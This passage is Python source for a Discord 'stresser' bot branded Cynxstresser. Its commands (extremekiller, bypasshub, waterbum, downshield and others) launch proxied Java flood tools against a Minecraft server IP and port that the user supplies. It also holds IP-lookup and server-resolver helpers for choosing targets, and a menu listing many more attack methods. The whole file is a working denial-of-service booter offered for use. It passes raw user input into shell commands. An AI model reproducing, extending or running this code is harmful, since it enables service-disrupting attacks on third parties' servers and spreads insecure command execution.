        await ctx.send(embed=embed)

@client.command()

async def extremekiller(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BruTalBOOT.jar {arg1} 15 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``extremekiller``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def bypasshub(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BruTalBOOT.jar {arg1} 13 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``bypasshub``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def spammer(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar BruTalBOOT.jar {arg1} 29 1 {arg2} 60 100 60 100 10 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``spammer``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)



@client.command()

async def waterbum(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 16 100000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``waterbum``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

@client.command()

async def cpup(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 18 100000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``cpup``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

    

@client.command()

async def emotialdamage(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -jar LonderBot.jar {arg1} 11 100000 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``waterbum``', value='**[𝗧𝗜𝗠𝗘]**: ``60sec``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)

    
@client.command()

async def downshield(ctx, arg1, arg2):
    if arg1 == '1.1.1.1':
        await ctx.send('You cant attack 1.1.1.1')
        pass
    else:
        def attack():
            os.system(f"java -Dperdelay=2500 -Ddelay=1 -Drmnwp=false -jar LegitBootV8.jar {arg1} 2 35 {arg2} 60 proxies.txt socks4")
            os.system(f"")

        embed = discord.Embed(title='>> ***ATTACK SENT SUCCESSFULLY*** <<',color=random.choice(colors) , timestamp= ctx.message.created_at)

        embed.add_field(name=f'[𝗧𝗔𝗥𝗚𝗘𝗧]: ``{arg1}``', inline=False, value=f'**[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟]**: ``{arg2}``')
        embed.add_field(name=f'[**𝗠𝗘𝗧𝗛𝗢𝗗**]: ``downshield``', value=f'**[𝗧𝗜𝗠𝗘]**: ``60``', inline=False)
        embed.add_field(name=f'[**𝗣𝗢𝗪𝗘𝗥**]: ``Maximum``', value='**[𝗔𝗨𝗧𝗛𝗢𝗥]**: ``Cynx``' , inline=False)
        embed.set_thumbnail(
        url='https://media.discordapp.net/attachments/964800182980059149/987727980367319110/9296f70fce1ae3f298e0d085c17f6a3f.gif')
    
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        embed.set_image(url=f'https://cdn.discordapp.com/attachments/984452619433050135/989905993116815360/rocket-silo.gif')
        t1 = threading.Thread(target=attack)

        t1.start()
        await ctx.send(embed=embed)




@client.command()
async def stop(ctx):
    os.system("pkill 'java'")
    embed = discord.Embed(
        title='**All attacks have been canceled!**',
        color=discord.Colour.green()
    )
    embed.set_image(url=f'')
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)



@client.command()
async def help(ctx):
    embed = discord.Embed(
        title=":zap:𝙃𝙀𝙇𝙋:zap:",
        color=discord.Colour.green(), timestamp= ctx.message.created_at
    )
    
    embed.add_field(name=f'***MENU***:', value='**$resolve** >> Java Edition Minecraft Servers \n **$bresolve** >> Bedrock Edition Minecraft Servers \n **$iplookup** >> IP Details \n **$methods** >> Methods Attack \n **$protocols** >> Minecraft Versions \n **$pinghost** >> Latency Target \n **$botping** >> Bot Latency \n **$stop** >> Stop all attack performs \n **$invite** >> Get Invite \n **$proxy** >> Proxy Renew')

    embed.set_thumbnail(
        url=''
    )
    #https://media.giphy.com/media/U4FkC2VqpeNRHjTDQ5/giphy-downsized-large.gif
    embed.set_image(url=f'https://cdn.discordapp.com/attachments/964800182980059149/988360082033082368/standard.gif')
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        
    await ctx.send(embed=embed)


@client.command()
async def methods(ctx):
    embed = discord.Embed(
        title=":fleur_de_lis: 𝙈𝙀𝙏𝙃𝙊𝘿𝙎 :fleur_de_lis:",
        color=discord.Colour.green(), timestamp= ctx.message.created_at
    )
    embed.add_field(name=f'𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗿𝗲𝘀𝘀𝗲𝗿', value='$cpudowner <ip:port> <protocol> \n $downshield <ip:port> <protocol> \n $rameater <ip:port> <protocol> \n $byte <ip:port> <protocol> \n $storm <ip:port> <protocol> \n  $waterbum <ip:port> <protocol> \n $bypasshub <ip:port> <protocol> \n $ultimatekiller <ip:port> <protocol> \n $extremekiller <ip:port> <protocol> \n $spammer <ip:port> <protocol> \n $aegis <ip:port> <protocol> \n $cpup <ip:port> <protocol> \n $emotialdamage <ip:port> <protocol> \n $tcpkiller <ip:port> <protocol> \n $brutalcpu <ip:port> <protocol> \n $cpufucker <ip:port> <protocol> \n $nullping <ip> <port> <protocol> \n $abdeluxe <ip> <port> <protocol> \n $flamecord <ip> <port> <protocol>' ,inline=False)
    embed.add_field(name=f'𝗠𝗶𝗻𝗲𝗰𝗿𝗮𝗳𝘁 𝗦𝘁𝗿𝗲𝘀𝘀𝗲𝗿 2 (for $attack) - $attack <ip:port> <protocol> <method>', value=', '.join([i for i in methods_list]), inline=True)
    embed.add_field(name=f'𝗟𝗮𝘆𝗲𝗿𝟰', value='coming soon', inline=False)
    embed.add_field(name=f'𝗟𝗮𝘆𝗲𝗿𝟳', value='coming soon', inline=False)


    embed.set_thumbnail(url='')
    embed.set_image(url=f'https://cdn.discordapp.com/attachments/964800182980059149/988360082033082368/standard.gif')
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        
    await ctx.send(embed=embed)


@client.command()
async def resolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Java Resolver",
        color=discord.Colour.green()
    )
    if json_object["online"] == False:
        emb = discord.Embed(color = discord.Color.red())
        emb.add_field(name = '❌ **ERROR**.', value = '**🚫 Server offline.**')
        await ctx.send(embed=emb)
        return
    else:
        statas = "Server online"
        embed.add_field(name='[𝗧𝗔𝗥𝗚𝗘𝗧]:', value=json_object["ip"], inline=False)
        embed.add_field(name='[𝗣𝗢𝗥𝗧]:', value=json_object["port"], inline=False)
        embed.add_field(name="[𝗣𝗟𝗔𝗬𝗘𝗥𝗦]:", value=json_object["players"], inline=False)
        embed.add_field(name="[𝗣𝗥𝗢𝗧𝗢𝗖𝗢𝗟𝗦]:", value=json_object["protocol"], inline=False)
        embed.add_field(name="[𝗩𝗘𝗥𝗦𝗜𝗢𝗡]:", value=json_object["version"], inline=False)
        embed.add_field(name="[𝗦𝗧𝗔𝗧𝗨𝗦]:", value=f"{statas}", inline=False)
        embed.set_thumbnail(
        url='https://media.giphy.com/media/3og0ILLVvPp8d64Jd6/giphy.gif'
        )
        embed.set_image(url=f'http://status.mclive.eu/{arg1}/{arg1}/banner.png')
        embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
        await ctx.send(embed=embed)



@client.command()
async def bresolve(ctx, arg1):
    url = "https://api.mcsrvstat.us/bedrock/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Bedrock Resolver",
        color=discord.Colour.green()
    )

    embed.add_field(name='[𝗧𝗔𝗥𝗚𝗘𝗧]:', value=json_object["ip"], inline=False)
    embed.add_field(name='[𝗣𝗢𝗥𝗧]:', value=json_object["port"], inline=False)
    
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    await ctx.send(embed=embed)



@client.command()
async def iplookup(ctx, arg1):
    url = "http://ipwhois.app/json/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="IP Resolver",
        color=discord.Colour.green() , timestamp= ctx.message.created_at
    )
    embed.add_field(name="Ip:", value=json_object["ip"], inline=False)
    embed.add_field(name="Type:", value=json_object["type"], inline=False)
    embed.add_field(name='Continent:', value=json_object["continent"], inline=False)
    embed.add_field(name="Region:", value=json_object["region"], inline=False)
    embed.add_field(name="Country:", value=json_object["country"], inline=False)
    embed.add_field(name="City:", value=json_object["city"], inline=False)
    embed.add_field(name="Latitude:", value=json_object["latitude"], inline=False)
    embed.add_field(name="Longitude:", value=json_object["longitude"], inline=False)
    embed.add_field(name="Timezone:", value=json_object["timezone_gmt"], inline=False)
    embed.add_field(name="ISP:", value=json_object["isp"], inline=False)
    embed.add_field(name="Org:", value=json_object["org"], inline=False)
    embed.add_field(name="ASN:", value=json_object["asn"], inline=False)
    embed.set_footer(text="𝐂𝐲𝐧𝐱𝐬𝐭𝐫𝐞𝐬𝐬𝐞𝐫 | 𝐂𝐲𝐧𝐱#𝟐𝟗𝟕𝟏")
    embed.set_image(url=f'https://cdn.discordapp.com/attachments/964800182980059149/988360082033082368/standard.gif')
    await ctx.send(embed=embed)


@client.command()
async def pinghost(ctx, arg1):
    url = "https://steakovercooked.com/api/ping/?host=" + arg1
    response = requests.get(url, verify=True) 
    await ctx.send(response.json())

client.run(token)
